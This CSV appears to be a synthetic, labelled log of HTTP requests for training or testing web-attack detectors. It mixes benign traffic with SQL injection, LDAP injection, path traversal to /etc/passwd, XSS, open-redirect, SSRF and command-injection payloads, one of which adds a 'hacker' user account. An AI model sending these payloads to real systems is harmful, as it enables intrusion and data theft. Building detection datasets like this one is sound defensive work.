timestamp,source_ip,dest_ip,method,host,path,query_string,full_url,user_agent,attack_type,is_attack
2026-04-07T15:07:43.270436,10.0.0.152,10.0.0.184,GET,secure.example.com,/about,limit=10&status=active&page=1,https://secure.example.com/about?limit=10&status=active&page=1,python-requests/2.31.0,benign,0
2026-04-07T15:05:41.517592,10.0.0.159,10.0.0.158,GET,shop.example.com,/admin,user=' UNION SELECT NULL--,http://shop.example.com/admin?user=' UNION SELECT NULL--,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",sql_injection,1
2026-04-07T13:40:44.368587,192.168.1.184,10.0.0.250,GET,192.168.1.100,/ldap,uid=%2A%28%29%7C%2526%27,https://192.168.1.100/ldap?uid=%2A%28%29%7C%2526%27,"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",ldap_injection,1
2026-04-07T14:32:12.717298,192.168.1.180,172.16.0.15,GET,example.com,/logout,brand=apple&from=2024-01-01&to=2024-12-31,http://example.com/logout?brand=apple&from=2024-01-01&to=2024-12-31,"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",benign,0
2026-04-07T15:14:22.650055,192.168.1.54,172.16.0.54,GET,test-app.local,/download/../../../var/log/auth.log,,http://test-app.local/download/../../../var/log/auth.log,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",path_traversal,1
2026-04-07T13:27:30.238057,192.168.1.214,10.0.0.191,HEAD,example.com,/blog,page=1,http://example.com/blog?page=1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",benign,0
2026-04-07T14:47:03.799817,172.16.0.113,172.16.0.3,GET,shop.example.com,/profile,,http://shop.example.com/profile,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",benign,0
2026-04-07T14:16:44.071832,172.16.0.235,192.168.1.134,GET,webapp.internal,/download,file=..0x2f..0x2f..0x2fetc/passwd,https://webapp.internal/download?file=..0x2f..0x2f..0x2fetc/passwd,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",path_traversal,1
2026-04-07T13:58:40.172433,172.16.0.253,192.168.1.187,GET,webapp.internal,/login,search=' GROUP BY columnname HAVING 1=1--,https://webapp.internal/login?search=' GROUP BY columnname HAVING 1=1--,"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",sql_injection,1
2026-04-07T15:01:28.700514,172.16.0.39,192.168.1.31,GET,admin.example.com,/out,dest=%2F%2Fevil.com%2Fpath,https://admin.example.com/out?dest=%2F%2Fevil.com%2Fpath,wfuzz/3.1.0,open_redirect,1
2026-04-07T14:10:44.573942,192.168.1.49,10.0.0.161,GET,192.168.1.100,/faq,,https://192.168.1.100/faq,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",benign,0
2026-04-07T14:19:37.788659,10.0.0.32,10.0.0.195,GET,secure.example.com,/search,query=admin%29%28%26%29,http://secure.example.com/search?query=admin%29%28%26%29,PostmanRuntime/7.35.0,ldap_injection,1
2026-04-07T13:53:02.353635,10.0.0.164,10.0.0.65,POST,shop.example.com,/products,q=' AND SLEEP(5)--,http://shop.example.com/products?q=' AND SLEEP(5)--,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",sql_injection,1
2026-04-07T15:18:28.556949,192.168.1.54,172.16.0.177,GET,secure.example.com,/redirect,next=javascript%3Aalert%28document.domain%29,https://secure.example.com/redirect?next=javascript%3Aalert%28document.domain%29,burpsuite,open_redirect,1
2026-04-07T13:58:08.011986,192.168.1.110,10.0.0.55,GET,webapp.internal,/products,,http://webapp.internal/products,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",benign,0
2026-04-07T14:59:58.929301,192.168.1.48,192.168.1.48,GET,api.example.com,/images/logo.png,order=name&from=2024-01-01,http://api.example.com/images/logo.png?order=name&from=2024-01-01,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",benign,0
2026-04-07T14:34:13.531568,10.0.0.212,10.0.0.187,POST,api.example.com,/events,sort=asc&brand=apple,http://api.example.com/events?sort=asc&brand=apple,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",benign,0
2026-04-07T14:47:52.215994,172.16.0.61,10.0.0.103,POST,api.example.com,/search,"name=<div style=""background:url('javascript:alert(1)')"">","http://api.example.com/search?name=<div style=""background:url('javascript:alert(1)')"">",ZAP/2.14.0,xss,1
2026-04-07T15:05:45.069685,172.16.0.167,172.16.0.250,GET,admin.example.com,/blog/category/tech,,http://admin.example.com/blog/category/tech,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",benign,0
2026-04-07T13:40:48.290554,10.0.0.79,10.0.0.142,POST,secure.example.com,/profile,,http://secure.example.com/profile,curl/8.4.0,benign,0
2026-04-07T14:47:00.823508,192.168.1.247,172.16.0.145,POST,shop.example.com,/checkout,,https://shop.example.com/checkout,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",benign,0
2026-04-07T14:40:43.626251,10.0.0.156,192.168.1.217,GET,api.example.com,/download/%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd,,http://api.example.com/download/%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd,PostmanRuntime/7.35.0,path_traversal,1
2026-04-07T14:36:06.920770,192.168.1.47,10.0.0.95,GET,admin.example.com,/about,view=list&q=laptop&brand=apple,http://admin.example.com/about?view=list&q=laptop&brand=apple,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,benign,0
2026-04-07T14:41:46.800590,10.0.0.233,192.168.1.6,GET,api.example.com,/search,username=x%29%28%7C%28cn%3D%2A%29,http://api.example.com/search?username=x%29%28%7C%28cn%3D%2A%29,nuclei,ldap_injection,1
2026-04-07T15:09:57.611027,10.0.0.251,192.168.1.164,GET,api.example.com,/lookup,query=%2A%29%28objectClass%3D%2A,https://api.example.com/lookup?query=%2A%29%28objectClass%3D%2A,curl/8.4.0,ldap_injection,1
2026-04-07T14:22:08.061090,192.168.1.5,10.0.0.233,HEAD,shop.example.com,/products,type=product&category=electronics,http://shop.example.com/products?type=product&category=electronics,python-requests/2.31.0,benign,0
2026-04-07T15:06:03.256600,172.16.0.190,172.16.0.18,GET,api.example.com,/comment,"search=""-alert(1)-""","http://api.example.com/comment?search=""-alert(1)-""",PostmanRuntime/7.35.0,xss,1
2026-04-07T14:20:17.605299,172.16.0.233,172.16.0.143,GET,admin.example.com,/url,redirect=https%3A%2F%2Fevil.com,https://admin.example.com/url?redirect=https%3A%2F%2Fevil.com,dirbuster,open_redirect,1
2026-04-07T14:00:49.669360,172.16.0.236,192.168.1.156,POST,example.com,/api/message,q=%3Cvideo%3E%3Csource%20onerror%3D%22alert%281%29%22%3E,http://example.com/api/message?q=%3Cvideo%3E%3Csource%20onerror%3D%22alert%281%29%22%3E,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",xss,1
2026-04-07T15:14:35.722948,172.16.0.44,172.16.0.209,GET,shop.example.com,/events,view=list&from=2024-01-01,http://shop.example.com/events?view=list&from=2024-01-01,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",benign,0
2026-04-07T14:54:28.434523,192.168.1.167,172.16.0.55,HEAD,api.example.com,/api/users,,http://api.example.com/api/users,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",benign,0
2026-04-07T14:30:59.615956,10.0.0.56,10.0.0.140,GET,api.example.com,/cart,,http://api.example.com/cart,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),benign,0
2026-04-07T15:31:10.182347,172.16.0.38,10.0.0.162,GET,webapp.internal,/faq,,http://webapp.internal/faq,PostmanRuntime/7.35.0,benign,0
2026-04-07T14:23:31.449820,172.16.0.142,192.168.1.112,GET,test-app.local,/search,,http://test-app.local/search,python-requests/2.31.0,benign,0
2026-04-07T15:27:48.953233,192.168.1.97,10.0.0.139,GET,test-app.local,/products,,https://test-app.local/products,python-requests/2.31.0,benign,0
2026-04-07T14:28:11.785326,172.16.0.18,172.16.0.210,GET,192.168.1.100,/api/user,cn=%2A%29%28uid%3Dadmin%29%29,http://192.168.1.100/api/user?cn=%2A%29%28uid%3Dadmin%29%29,python-requests/2.31.0,ldap_injection,1
2026-04-07T13:31:09.413507,192.168.1.19,172.16.0.126,POST,10.0.0.50,/profile,"query='><script>alert(String.fromCharCode(88,83,83))</script>","http://10.0.0.50/profile?query='><script>alert(String.fromCharCode(88,83,83))</script>",Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),xss,1
2026-04-07T14:22:56.611824,192.168.1.11,192.168.1.187,HEAD,10.0.0.50,/api/v1/health,view=list&lang=en,http://10.0.0.50/api/v1/health?view=list&lang=en,curl/8.4.0,benign,0
2026-04-07T15:06:20.869289,172.16.0.43,10.0.0.74,GET,192.168.1.100,/out,target=%2F%2Fgoogle.com%252f%40evil.com,https://192.168.1.100/out?target=%2F%2Fgoogle.com%252f%40evil.com,"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",open_redirect,1
2026-04-07T13:56:52.232494,172.16.0.27,10.0.0.202,POST,api.example.com,/events,lang=en&sort=asc,http://api.example.com/events?lang=en&sort=asc,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),benign,0
2026-04-07T14:52:28.969570,172.16.0.218,192.168.1.182,GET,shop.example.com,/check,src=http%3A%2F%2Fcustomer1.app.localhost%2F,https://shop.example.com/check?src=http%3A%2F%2Fcustomer1.app.localhost%2F,dirbuster,ssrf,1
2026-04-07T13:50:49.161151,192.168.1.184,192.168.1.100,POST,secure.example.com,/api/v2/data,to=2024-12-31&id=123&filter=recent,http://secure.example.com/api/v2/data?to=2024-12-31&id=123&filter=recent,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",benign,0
2026-04-07T14:17:27.108108,172.16.0.193,192.168.1.229,HEAD,admin.example.com,/api/users,,https://admin.example.com/api/users,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,benign,0
2026-04-07T13:46:13.651684,172.16.0.83,172.16.0.18,POST,api.example.com,/api/message,"message=<video><source onerror=""alert(1)"">","https://api.example.com/api/message?message=<video><source onerror=""alert(1)"">",dirbuster,xss,1
2026-04-07T14:11:06.623069,172.16.0.89,172.16.0.42,POST,admin.example.com,/register,format=json&sort=asc,http://admin.example.com/register?format=json&sort=asc,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,benign,0
2026-04-07T13:27:33.176012,192.168.1.183,10.0.0.10,GET,admin.example.com,/blog,to=2024-12-31&status=active&q=laptop,http://admin.example.com/blog?to=2024-12-31&status=active&q=laptop,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",benign,0
2026-04-07T14:18:40.635355,172.16.0.196,10.0.0.218,GET,192.168.1.100,/logout,type=product&category=electronics,http://192.168.1.100/logout?type=product&category=electronics,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",benign,0
2026-04-07T14:21:29.419040,10.0.0.147,10.0.0.76,HEAD,api.example.com,/api/v2/data,,http://api.example.com/api/v2/data,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",benign,0
2026-04-07T14:06:02.915990,192.168.1.2,192.168.1.164,GET,admin.example.com,/products,page=1,http://admin.example.com/products?page=1,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",benign,0
2026-04-07T14:37:48.927682,192.168.1.203,10.0.0.59,GET,webapp.internal,/link,dest=%2F%5Cevil.com,https://webapp.internal/link?dest=%2F%5Cevil.com,python-requests/2.31.0,open_redirect,1
2026-04-07T14:19:14.660689,10.0.0.232,172.16.0.130,GET,webapp.internal,/contact,view=list&category=electronics&to=2024-12-31,http://webapp.internal/contact?view=list&category=electronics&to=2024-12-31,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",benign,0
2026-04-07T14:17:01.930180,192.168.1.91,172.16.0.41,POST,webapp.internal,/privacy,type=product,http://webapp.internal/privacy?type=product,PostmanRuntime/7.35.0,benign,0
2026-04-07T14:33:34.875715,192.168.1.51,172.16.0.164,POST,192.168.1.100,/faq,id=123&q=laptop&type=product,http://192.168.1.100/faq?id=123&q=laptop&type=product,python-requests/2.31.0,benign,0
2026-04-07T13:45:14.509247,10.0.0.77,172.16.0.41,GET,test-app.local,/css/style.css,to=2024-12-31,http://test-app.local/css/style.css?to=2024-12-31,curl/8.4.0,benign,0
2026-04-07T15:04:14.595690,10.0.0.177,10.0.0.184,GET,api.example.com,/privacy,,https://api.example.com/privacy,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",benign,0
2026-04-07T14:39:17.895076,192.168.1.205,172.16.0.91,GET,webapp.internal,/redir,redirect=%2F%2F%2F%2Fevil.com,https://webapp.internal/redir?redirect=%2F%2F%2F%2Fevil.com,masscan/1.3,open_redirect,1
2026-04-07T15:01:56.157327,172.16.0.33,172.16.0.78,HEAD,shop.example.com,/css/style.css,limit=10&filter=recent&sort=asc,http://shop.example.com/css/style.css?limit=10&filter=recent&sort=asc,python-requests/2.31.0,benign,0
2026-04-07T14:41:20.795314,192.168.1.66,10.0.0.175,GET,secure.example.com,/download/%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd,,https://secure.example.com/download/%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd,masscan/1.3,path_traversal,1
2026-04-07T13:59:17.623077,10.0.0.240,10.0.0.90,GET,webapp.internal,/load,file=..%255c..%255c..%255cetc/passwd,http://webapp.internal/load?file=..%255c..%255c..%255cetc/passwd,sqlmap/1.7.12#dev,path_traversal,1
2026-04-07T13:40:02.618670,192.168.1.225,10.0.0.230,POST,api.example.com,/dashboard,,http://api.example.com/dashboard,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",benign,0
2026-04-07T15:20:50.812269,10.0.0.92,10.0.0.254,POST,admin.example.com,/faq,brand=apple&type=product&view=list,http://admin.example.com/faq?brand=apple&type=product&view=list,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),benign,0
2026-04-07T14:41:44.603143,192.168.1.105,192.168.1.143,GET,admin.example.com,/view,file=..%255c..%255c..%255cetc/passwd,http://admin.example.com/view?file=..%255c..%255c..%255cetc/passwd,gobuster/3.6,path_traversal,1
2026-04-07T14:24:14.123678,10.0.0.114,10.0.0.227,GET,secure.example.com,/link,url=%2F%5Cevil.com,https://secure.example.com/link?url=%2F%5Cevil.com,masscan/1.3,open_redirect,1
2026-04-07T14:59:18.725056,172.16.0.147,192.168.1.113,GET,test-app.local,/download/..%2f..%2f..%2fetc%2fpasswd,,https://test-app.local/download/..%2f..%2f..%2fetc%2fpasswd,dirbuster,path_traversal,1
2026-04-07T14:34:49.883280,10.0.0.134,192.168.1.53,GET,example.com,/download/../../../etc/passwd,,http://example.com/download/../../../etc/passwd,python-requests/2.31.0,path_traversal,1
2026-04-07T15:31:36.313079,172.16.0.158,10.0.0.104,GET,example.com,/api/execute,host=test; echo vulnerable,http://example.com/api/execute?host=test; echo vulnerable,gobuster/3.6,command_injection,1
2026-04-07T14:37:07.126585,10.0.0.82,192.168.1.227,POST,secure.example.com,/comment,"query=<div style=""background:url('javascript:alert(1)')"">","https://secure.example.com/comment?query=<div style=""background:url('javascript:alert(1)')"">",sqlmap/1.7.12#dev,xss,1
2026-04-07T15:02:21.856194,192.168.1.107,10.0.0.112,POST,test-app.local,/comment,"q=<div style=""background:url('javascript:alert(1)')"">","https://test-app.local/comment?q=<div style=""background:url('javascript:alert(1)')"">","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",xss,1
2026-04-07T13:40:41.777088,172.16.0.105,192.168.1.178,GET,10.0.0.50,/search,type=product&view=list&lang=en,http://10.0.0.50/search?type=product&view=list&lang=en,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",benign,0
2026-04-07T13:37:11.794490,192.168.1.23,192.168.1.251,POST,api.example.com,/admin/run,ip=test& net user hacker hacker123 /add,http://api.example.com/admin/run?ip=test& net user hacker hacker123 /add,sqlmap/1.7.12#dev,command_injection,1
2026-04-07T15:00:39.638080,192.168.1.167,172.16.0.204,POST,secure.example.com,/products,username=' OR 'a'='a,https://secure.example.com/products?username=' OR 'a'='a,masscan/1.3,sql_injection,1
2026-04-07T14:45:07.534472,192.168.1.241,172.16.0.164,GET,api.example.com,/blog,to=2024-12-31&q=laptop,http://api.example.com/blog?to=2024-12-31&q=laptop,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",benign,0
2026-04-07T14:35:03.900345,192.168.1.215,172.16.0.206,GET,webapp.internal,/api/v1/health,id=123&filter=recent,http://webapp.internal/api/v1/health?id=123&filter=recent,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),benign,0
2026-04-07T15:02:29.897668,10.0.0.70,10.0.0.170,GET,api.example.com,/lookup,query=%2A%29%28mail%3D%2A,http://api.example.com/lookup?query=%2A%29%28mail%3D%2A,ZAP/2.14.0,ldap_injection,1
2026-04-07T13:38:23.982959,172.16.0.118,10.0.0.228,GET,shop.example.com,/faq,,http://shop.example.com/faq,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,benign,0
2026-04-07T14:40:32.371586,192.168.1.118,192.168.1.207,GET,webapp.internal,/css/style.css,,https://webapp.internal/css/style.css,python-requests/2.31.0,benign,0
2026-04-07T15:23:39.337730,172.16.0.5,192.168.1.198,POST,shop.example.com,/search,,http://shop.example.com/search,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",benign,0
2026-04-07T15:08:40.415415,192.168.1.81,172.16.0.246,GET,admin.example.com,/privacy,,https://admin.example.com/privacy,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",benign,0
2026-04-07T13:54:24.717928,10.0.0.220,192.168.1.60,GET,192.168.1.100,/dashboard,to=2024-12-31&lang=en,http://192.168.1.100/dashboard?to=2024-12-31&lang=en,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",benign,0
2026-04-07T14:43:14.833338,10.0.0.19,192.168.1.121,POST,shop.example.com,/notifications,,https://shop.example.com/notifications,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",benign,0
2026-04-07T14:40:04.020657,10.0.0.198,172.16.0.179,GET,10.0.0.50,/index.html,,http://10.0.0.50/index.html,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",benign,0
2026-04-07T14:51:25.573674,172.16.0.25,192.168.1.185,HEAD,api.example.com,/dashboard,limit=10&q=laptop,http://api.example.com/dashboard?limit=10&q=laptop,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",benign,0
2026-04-07T13:29:42.540138,172.16.0.199,192.168.1.219,GET,webapp.internal,/feedback,input=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,https://webapp.internal/feedback?input=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,python-requests/2.31.0,xss,1
2026-04-07T14:23:25.738035,10.0.0.176,10.0.0.240,GET,test-app.local,/api/users,user=' UNION SELECT NULL--,https://test-app.local/api/users?user=' UNION SELECT NULL--,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",sql_injection,1
2026-04-07T15:27:29.468915,172.16.0.160,192.168.1.59,GET,test-app.local,/register,,http://test-app.local/register,python-requests/2.31.0,benign,0
2026-04-07T14:26:30.870650,192.168.1.29,172.16.0.154,HEAD,10.0.0.50,/terms,type=product&order=name&lang=en,https://10.0.0.50/terms?type=product&order=name&lang=en,curl/8.4.0,benign,0
2026-04-07T15:31:53.012701,192.168.1.67,192.168.1.123,GET,192.168.1.100,/admin,username=' GROUP BY columnname HAVING 1=1--,http://192.168.1.100/admin?username=' GROUP BY columnname HAVING 1=1--,nikto/2.5.0,sql_injection,1
2026-04-07T15:31:18.442880,172.16.0.100,172.16.0.49,GET,10.0.0.50,/api/v1/health,,http://10.0.0.50/api/v1/health,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",benign,0
2026-04-07T14:37:22.273594,192.168.1.111,192.168.1.190,GET,192.168.1.100,/download/file:///etc/passwd,,http://192.168.1.100/download/file:///etc/passwd,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),path_traversal,1
2026-04-07T14:03:49.041317,172.16.0.201,172.16.0.149,HEAD,10.0.0.50,/blog/post/1,,http://10.0.0.50/blog/post/1,PostmanRuntime/7.35.0,benign,0
2026-04-07T13:41:03.794019,10.0.0.232,192.168.1.231,GET,192.168.1.100,/check,url=http%3A%2F%2F192.168.1.1%2F,http://192.168.1.100/check?url=http%3A%2F%2F192.168.1.1%2F,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",ssrf,1
2026-04-07T14:00:38.841433,172.16.0.22,172.16.0.75,POST,shop.example.com,/terms,order=name&q=laptop&from=2024-01-01,http://shop.example.com/terms?order=name&q=laptop&from=2024-01-01,curl/8.4.0,benign,0
2026-04-07T13:56:42.111380,192.168.1.10,192.168.1.129,GET,192.168.1.100,/return,goto=https%3Aevil.com,http://192.168.1.100/return?goto=https%3Aevil.com,dirbuster,open_redirect,1
2026-04-07T14:59:31.195022,192.168.1.118,172.16.0.2,POST,admin.example.com,/feedback,comment=<img src=1 onerror=alert(1)>,http://admin.example.com/feedback?comment=<img src=1 onerror=alert(1)>,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,xss,1
2026-04-07T14:48:20.055721,172.16.0.188,192.168.1.20,GET,example.com,/search,,https://example.com/search,curl/8.4.0,benign,0
2026-04-07T13:48:24.062610,192.168.1.171,192.168.1.71,GET,example.com,/login,type=product,https://example.com/login?type=product,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,benign,0
2026-04-07T14:35:04.295306,172.16.0.169,192.168.1.254,GET,192.168.1.100,/images/logo.png,filter=recent,http://192.168.1.100/images/logo.png?filter=recent,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,benign,0
2026-04-07T13:27:08.246979,10.0.0.60,172.16.0.240,GET,test-app.local,/terms,,https://test-app.local/terms,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",benign,0
2026-04-07T15:28:22.885986,172.16.0.116,172.16.0.115,GET,test-app.local,/search,cn=%2A%29%28uid%3Dadmin%29%29,https://test-app.local/search?cn=%2A%29%28uid%3Dadmin%29%29,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,ldap_injection,1
2026-04-07T15:28:38.540141,10.0.0.75,10.0.0.26,GET,test-app.local,/search,,http://test-app.local/search,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",benign,0
2026-04-07T14:38:20.759730,192.168.1.230,10.0.0.238,GET,webapp.internal,/api/products,sort=asc&type=product&lang=en,http://webapp.internal/api/products?sort=asc&type=product&lang=en,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",benign,0
2026-04-07T15:02:16.011226,10.0.0.20,192.168.1.65,GET,secure.example.com,/ldap,filter=%2A%29%29%2500,https://secure.example.com/ldap?filter=%2A%29%29%2500,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",ldap_injection,1
2026-04-07T14:43:42.907858,10.0.0.38,172.16.0.24,GET,test-app.local,/faq,format=json,http://test-app.local/faq?format=json,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",benign,0
